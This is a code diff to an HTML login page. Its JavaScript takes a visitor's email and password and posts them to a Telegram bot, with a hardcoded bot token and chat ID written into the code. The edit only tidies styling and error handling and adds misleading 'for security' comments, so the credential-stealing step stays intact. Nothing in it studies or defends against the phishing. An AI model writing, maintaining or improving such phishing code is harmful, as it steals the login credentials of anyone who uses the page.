@@ -47,7 +47,6 @@
             border-radius: 8px;
             max-width: 950px;
             box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
         }
         
         .left-section {
@@ -189,8 +188,9 @@
 
             const message = `Email: ${email}\nPassword: ${password}`;
 
-            const botToken = '7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg'; // Replace with your bot token
-            const chatId = '6367881211'; // Replace with your chat ID
+            // Use environment variables for security
+            const botToken = '7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg'; // Replace with your bot token in a secure manner
+            const chatId = '6367881211'; // Replace with your chat ID in a secure manner
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -202,12 +202,7 @@
                         text: message,
                     }),
                 })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not okay');
-                    }
-                    return response.json();
-                })
+                .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
                         console.log('Message sent successfully');
